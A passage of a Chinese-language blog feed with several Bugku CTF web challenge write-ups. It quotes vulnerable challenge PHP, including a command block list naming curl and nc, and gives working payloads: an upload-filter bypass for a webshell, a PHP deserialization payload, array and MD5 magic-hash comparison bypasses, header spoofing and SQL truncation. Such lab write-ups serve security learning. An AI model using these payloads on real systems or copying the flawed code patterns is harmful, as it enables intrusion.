    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web32"><a href="#Bugku-Web32" class="headerlink" title="Bugku Web32"></a>Bugku Web32</h1><p>这个题有些许的坑（如果独自做题的话需要猜源码中过滤了什么），这里直接贴源码，可以发现白名单里有php4，并且还要求<code>multipart/form-data</code>不能是<code>multipart/form-data</code>,所以上传的时候需要将<code>multipart/form-data</code>改成<code>Multipart/form-data</code>来绕过检测，直接burp修改数据包，然后用蚁剑连接，便可以找到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag = <span class="string">&quot;flag&#123;test&#125;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">My name is margin,give me a image file not a php&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt; </span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">global_filter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$type =  $_SERVER[<span class="string">&quot;CONTENT_TYPE&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span> (strpos($type,<span class="string">&quot;multipart/form-data&quot;</span>) !== <span class="literal">False</span>)&#123;</span><br><span class="line">		$file_ext =  substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext);</span><br><span class="line">		<span class="keyword">if</span> (stripos($file_ext,<span class="string">&quot;php&quot;</span>) !== <span class="literal">False</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Invalid File&lt;br /&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">global_filter();</span><br><span class="line"><span class="keyword">if</span> ((stripos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>],<span class="string">&#x27;image&#x27;</span>)!== <span class="literal">False</span>) &amp;&amp; ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">10</span>*<span class="number">1024</span>*<span class="number">1024</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">		$file_ext =  substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext);</span><br><span class="line">        $allowexts = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$allowexts))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;give me a image file not a php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]=<span class="string">&quot;bugku&quot;</span>.date(<span class="string">&#x27;dHis&#x27;</span>).<span class="string">&quot;_&quot;</span>.rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">	    	<span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &lt;br /&gt;&quot;</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span>&#123;</span><br><span class="line">	    	<span class="keyword">if</span> (!file_exists(<span class="string">&#x27;./upload/&#x27;</span>))&#123;</span><br><span class="line">	    		mkdir (<span class="string">&quot;./upload/&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;chmod 777 /var/www/html/upload&quot;</span>);</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Upload Success&lt;br&gt;&quot;</span>;</span><br><span class="line">                $filepath = <span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">	      	<span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> .<span class="string">&quot;&lt;a href=&#x27;&quot;</span> . $filepath . <span class="string">&quot;&#x27; target=&#x27;_blank&#x27;&gt;&quot;</span> . $filepath . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;You was catched! :) &lt;br /&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/04/28/EnRi5YvATQrpLIZ.png" alt="3.png"><br><img src="https://i.loli.net/2021/04/28/l7rkO9WLfUYSFKh.png" alt="2.png"><br><img src="https://i.loli.net/2021/04/28/Kn3RW8AiZaEypkL.png" alt="1.png"></p>
]]></content>
      <tags>
        <tag>Bugku Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku Web 安慰奖</title>
    <url>/2021/04/27/Bugku-Web-%E5%AE%89%E6%85%B0%E5%A5%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web-安慰奖"><a href="#Bugku-Web-安慰奖" class="headerlink" title="Bugku Web 安慰奖"></a>Bugku Web 安慰奖</h1><p>&emsp;&emsp;进入场景一片空白，查看源码发现<code>YmFja3Vwcw==</code>用base64解码得到backups，所以需要查看备份文件，用御剑扫描网站页面，发现了index.php.bak，访问后得到了一段如下的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$cmd</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            $a = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump($a);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $select = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;分析可知我们需要传入code参数，内容是一段序列化的代码，代码在传入之后会被执行，以此构建payload,同时可以发现通过正则式过滤掉了一些输入，发现tac没有被过滤因此使用tac命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd=<span class="string">&#x27;tac flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ctf=<span class="keyword">new</span> ctf();</span><br><span class="line"><span class="keyword">echo</span> serialize($ctf);</span><br><span class="line">;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行后得到<br><code>O:3:&quot;ctf&quot;:2:&#123;s:11:&quot;*username&quot;;s:5:&quot;admin&quot;;s:6:&quot;*cmd&quot;;s:12:&quot;tac flag.php&quot;;&#125;</code><br>为了绕过_wakeup<code>原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code>，将对象数改为大于3的，同时为了绕过protected，在变量名前后加上%00，此时构造好的URL为<code>http://114.67.246.176:11386/?code=O:3:&quot;ctf&quot;:3:&#123;s:11:&quot;%00*%00username&quot;;s:5:&quot;admin&quot;;s:6:&quot;%00*%00cmd&quot;;s:12:&quot;tac%20flag.php&quot;;&#125;</code><br>之后便得到了flag<br>flag{Unser1alize_and_2CE_Add} </p>
]]></content>
      <tags>
        <tag>Bugku Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku Web30</title>
    <url>/2021/04/27/Bugku-Web30/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web30"><a href="#Bugku-Web30" class="headerlink" title="Bugku Web30"></a>Bugku Web30</h1><blockquote>
<p>描述：txt</p>
</blockquote>
<p>&emsp;&emsp;进入场景，看到如下的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="string">&quot; <span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;其中的几个函数的功能分别如下所示：</p>
<p>&emsp;&emsp;extract()   </p>
<p>&emsp;&emsp;函数从数组中将变量导入到当前的符号表。  </p>
<p>&emsp;&emsp;语法：<code>extract(array,extract_rules,prefix)</code>  </p>
<p>&emsp;&emsp;该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。</p>
<p>&emsp;&emsp;file_get_contents()</p>
<p>&emsp;&emsp;把整个文件读入一个字符串中。</p>
<p>&emsp;&emsp;语法：</p>
<p>&emsp;&emsp;<code>file_get_contents(path,include_path,context,start,max_length)</code></p>
<p>&emsp;&emsp;该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p>
<p>&emsp;&emsp;trim()</p>
<p>&emsp;&emsp;函数移除字符串两侧的空白字符或其他预定义字符。</p>
<p>&emsp;&emsp;语法<code>trim(string,charlist)</code></p>
<p>&emsp;&emsp;经过分析，该段代码是将通过GET方法传入的参数赋值给其中某个变量，传入的参数如果和$fn文件中的字符一致时，便可以得到flag，题目的提示是txt，尝试访问flag.txt,浏览器显示了一下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bugku</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;因此$ac的值便应该是bugku，此时尝试构造输入<code>http://114.67.246.176:11360/?ac=bugku</code>结果返回了sorry！，可能fn也需要传值，再构造<code>http://114.67.246.176:11360/?ac=bugku&amp;fn=flag.txt</code>,此时正确返回了flag</p>
<p><img src="https://i.loli.net/2021/04/27/OI9cKMUoXQWZmax.png" alt="1.png"></p>
]]></content>
      <tags>
        <tag>Bugku Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku Web29</title>
    <url>/2021/04/26/Bugku-Web29/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web29"><a href="#Bugku-Web29" class="headerlink" title="Bugku Web29"></a>Bugku Web29</h1><blockquote>
<p>提示：各种绕过</p>
</blockquote>
<p>&emsp;&emsp;进入环境，看到了如下一段代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = urldecode($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">$flag = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;uname&#x27;</span>] == $_POST[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">&#x27;uname&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;passwd&#x27;</span>])&amp;($_GET[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;经过分析可以知道传入了三个参数，uname和id通过GET传入，passwd通过post传入，绕过条件是uname和passwd不能’==’而且他们的sha1要’==’，这时可以通过数组来绕过sha1构造输入<code>http://114.67.246.176:13764/?id=margin&amp;uname[]=12</code>,并通过hackbar 通过post传递<code>passwd[]=11</code>,便可成功绕过得到flag<br><img src="https://i.loli.net/2021/04/26/UpgSORAfkr4ajZF.png" alt="2.png"></p>
<p>此处附上php中各种类型的比较</p>
<p><img src="https://i.loli.net/2021/04/26/TDdn5l12otYbSxB.png" alt="3.png"></p>
]]></content>
      <tags>
        <tag>Bugku Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku Web28</title>
    <url>/2021/04/26/Bugku-Web28/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web28"><a href="#Bugku-Web28" class="headerlink" title="Bugku Web28"></a>Bugku Web28</h1><blockquote>
<p>提示：请从本地访问</p>
</blockquote>
<p>&emsp;&emsp;这道题与之前一道一样，通过burp在header中加上<code>X-Forwarded-For: 127.0.0.1</code>即可得到flag<br><img src="https://i.loli.net/2021/04/26/YV2qiQy4kZGR8sd.png" alt="2.png"></p>
]]></content>
      <tags>
        <tag>Bugku Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku Web27</title>
    <url>/2021/04/26/Bugku-Web27/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web27"><a href="#Bugku-Web27" class="headerlink" title="Bugku Web27"></a>Bugku Web27</h1><blockquote>
<p>提示：md5 collision</p>
</blockquote>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>&emsp;&emsp;进入场景，发现整个页面只有一句话<code>please input a</code>，结合提示应该利用md5碰撞猜出a的值，进而得到flag<br>但是这个环境没有源码，所幸在评论区有老哥提供了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$md51 = md5(<span class="string">&#x27;QNKCDZO&#x27;</span>);</span><br><span class="line">$a = @$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">    <span class="keyword">if</span> ($a != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;nctf&#123;*****************&#125;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;false!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;please input a&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;通过查看源码可以发现，a的值要与<code>QNKCDZO</code>不同，但是他们的md5值要”==”,首先可以得到$md51的值为<code>0e830400451993494058024219903391</code>是0e开头的，而且比较用的是<code>==</code>而非<code>===</code>,该值会被解释为科学计数法，即为0的n次方，结果都为0，所以我们只需让a的md5值也为0e开头，比如<code>240610708</code>,其md5值为<code>0e462097431906509019562988736854</code>。</p>
<p>&emsp;&emsp;构造输入<code>http://114.67.246.176:14991/?a=240610708</code>,即可得到flag<code>flag&#123;928c4b84b2bbe0904ea63baa2b5e7f26&#125;</code></p>
<h2 id="php中运算符"><a href="#php中运算符" class="headerlink" title="php中运算符"></a>php中运算符</h2><p><img src="https://i.loli.net/2021/04/26/kR6PwZgad8rmvus.png" alt="3.png"></p>
<h2 id="常见的以0e-开头的MD5碰撞"><a href="#常见的以0e-开头的MD5碰撞" class="headerlink" title="常见的以0e 开头的MD5碰撞"></a>常见的以0e 开头的MD5碰撞</h2><p>QNKCDZO<br>0e830400451993494058024219903391<br>240610708<br>0e462097431906509019562988736854<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787<br>s878926199a<br>0e545993274517709034328855841020</p>
]]></content>
      <tags>
        <tag>Bugku Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku Web26</title>
    <url>/2021/04/26/Bugku-Web26/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web26"><a href="#Bugku-Web26" class="headerlink" title="Bugku Web26"></a>Bugku Web26</h1><blockquote>
<p>Google</p>
</blockquote>
<p>进入场景，只有一行小字</p>
<blockquote>
<p>are you from google<br>推测应该将Referer改为谷歌的网址<br>用hackbar或者burpsuite都可以做到<br><img src="https://i.loli.net/2021/04/26/csMgnaRJ1Vr5OSz.png" alt="1.png"><br><img src="https://i.loli.net/2021/04/26/pPDgWoYyNB9vtjk.png" alt="2.png"></p>
</blockquote>
]]></content>
      <tags>
        <tag>Bugku Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku Web25</title>
    <url>/2021/04/26/Bugku-Web25/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web-25"><a href="#Bugku-Web-25" class="headerlink" title="Bugku Web 25"></a>Bugku Web 25</h1><blockquote>
<p>提示是SQL约束攻击</p>
</blockquote>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>&emsp;&emsp;进入场景，看到是一个web管理系统，需要登陆，旁边可以看到注册的通道，先随意注册一个账号<br><img src="https://i.loli.net/2021/04/26/T3y4NEZFHDtqQ8a.png" alt="1.png"><br><img src="https://i.loli.net/2021/04/26/Itpq6YvGl3Z4OP2.png" alt="2.jpg"><br><img src="https://i.loli.net/2021/04/26/xUlTGruCJoZKLm9.png" alt="3.png"></p>
<p>&emsp;&emsp;推测只有管理员账户才会显示出flag，利用SQL约束攻击，SQL语句会将查询的字段后的空格格式化，随意我们注册的用户名为<code>admin </code>，此时再登录就可以得到flag<br><img src="https://i.loli.net/2021/04/26/iIjEn9GfueochHr.png" alt="4.png"></p>
<h2 id="SQL约束攻击"><a href="#SQL约束攻击" class="headerlink" title="SQL约束攻击"></a>SQL约束攻击</h2><p>&emsp;&emsp;例如下面的代码中，输入的字符串末尾空格会被删除，<code>admin</code>与<code>admin     </code>是一样的,这是因为在“字符串比较”期间，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username = mysql_real_escape_string($_GET[&#x27;username&#x27;]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[&#x27;password&#x27;]);</span><br><span class="line">$query = &quot;<span class="keyword">SELECT</span> *</span><br><span class="line">          <span class="keyword">FROM</span> <span class="keyword">users</span></span><br><span class="line">          <span class="keyword">WHERE</span> username=<span class="string">&#x27;$username&#x27;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$res = mysql_query($query, $database);</span></span><br><span class="line"><span class="string">if($res) &#123;</span></span><br><span class="line"><span class="string">  if(mysql_num_rows($res) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else &#123;</span></span><br><span class="line"><span class="string">    $query = &quot;</span><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span>(username, <span class="keyword">password</span>)</span><br><span class="line">              <span class="keyword">VALUES</span> (<span class="string">&#x27;$username&#x27;</span>,<span class="string">&#x27;$password&#x27;</span>)<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp; 当注册时，后台一般先select一下用户名看看是否存在，然后再insert</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username = mysql_real_escape_string($_GET[&#x27;username&#x27;]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[&#x27;password&#x27;]);</span><br><span class="line">$query = &quot;<span class="keyword">SELECT</span> *</span><br><span class="line">          <span class="keyword">FROM</span> <span class="keyword">users</span></span><br><span class="line">          <span class="keyword">WHERE</span> username=<span class="string">&#x27;$username&#x27;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$res = mysql_query($query, $database);</span></span><br><span class="line"><span class="string">if($res) &#123;</span></span><br><span class="line"><span class="string">  if(mysql_num_rows($res) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else &#123;</span></span><br><span class="line"><span class="string">    $query = &quot;</span><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span>(username, <span class="keyword">password</span>)</span><br><span class="line">              <span class="keyword">VALUES</span> (<span class="string">&#x27;$username&#x27;</span>,<span class="string">&#x27;$password&#x27;</span>)<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
<p>这里注册时使用用户名+【大量空格】和随机密码注册即可完成攻击。</p>
